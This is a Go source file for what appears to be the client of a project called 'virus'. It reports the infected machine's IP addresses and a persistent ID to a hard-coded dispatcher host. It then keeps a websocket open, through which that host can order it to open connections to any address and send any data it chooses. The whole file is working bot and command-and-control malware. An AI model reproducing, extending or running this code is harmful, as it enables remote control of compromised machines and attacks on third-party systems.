package main

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"time"

	"github.com/gorilla/websocket"
	"github.com/jessevdk/go-flags"
	"github.com/kolya59/virus/common/machine"
	"github.com/kolya59/virus/common/models"
	"github.com/rs/zerolog/log"
	uuid "github.com/satori/go.uuid"
)

type options struct {
	DispatcherURL string `long:"dispatcher-host" env:"DISPATCHER" required:"true" default:"trrp-virus.ew.r.appspot.com"`
}

var (
	interval = 10 * time.Second
)

func sendData(machine machine.Machine, dispatcherHost string) error {
	// Marshal data
	raw, err := json.Marshal(machine)
	if err != nil {
		return err
	}

	// Set up a connection to dispatcher.
	u := url.URL{Scheme: "https", Host: dispatcherHost, Path: "/machine"}
	resp, err := http.Post(u.String(), "application/json", bytes.NewBuffer(raw))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return err
	}
	return nil
}

func subscribeForCommands(dispatcherHost string) error {
	u := url.URL{Scheme: "wss", Host: dispatcherHost, Path: "/subscribe"}

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		return err
	}
	defer c.Close()

	cnt := 0
	var msg models.WSCommand
	for {
		if err := c.ReadJSON(&msg); err != nil {
			return err
		}
		cnt++
		log.Info().Msgf("Got %d msg", cnt)

		ackMsg := models.WSAck{}

		nc, err := net.Dial(msg.Type, msg.Addr)
		if err != nil {
			ackMsg.Err = err.Error()
			if err := c.WriteJSON(models.WSAck{Err: err.Error()}); err != nil {
				return err
			}
			continue
		}

		if _, err := nc.Write(msg.Data); err != nil {
			log.Error().Err(err).Msg("Failed to do request")
			ackMsg.Err = err.Error()
			nc.Close()
			if err := c.WriteJSON(models.WSAck{Err: err.Error()}); err != nil {
				return err
			}
			break
		}

		if err := c.WriteJSON(models.WSAck{}); err != nil {
			return err
		}
		nc.Close()
	}

	return nil
}

func main() {
	var opts options
	if _, err := flags.Parse(&opts); err != nil {
		return
	}
	dispatcherHost := opts.DispatcherURL

	m := machine.Machine{}
	m.GetIPS()

	id, err := ioutil.ReadFile("./tmp")
	if err != nil {
		m.ID = uuid.NewV4().String()
		ioutil.WriteFile("./tmp", []byte(m.ID), os.FileMode(0777))
	} else {
		uid, err := uuid.FromString(string(id))
		if err != nil {
			m.ID = uuid.NewV4().String()
			ioutil.WriteFile("./tmp", []byte(m.ID), os.FileMode(0777))
		} else {
			m.ID = uid.String()
		}
	}

	ticker := time.NewTicker(interval)
	errs := make(chan error, 1)
	errs <- sendData(m, dispatcherHost)
loopSend:
	for {
		select {
		case err := <-errs:
			if err == nil {
				break loopSend
			}
		case <-ticker.C:
			log.Info().Msg("Tried to reconnect")
			errs <- sendData(m, dispatcherHost)
		}
	}

	errs <- subscribeForCommands(dispatcherHost)
loopSub:
	for {
		select {
		case err := <-errs:
			if err == nil {
				break loopSub
			}
		case <-ticker.C:
			log.Info().Msg("Tried to reconnect")
			errs <- subscribeForCommands(dispatcherHost)
		}
	}
}
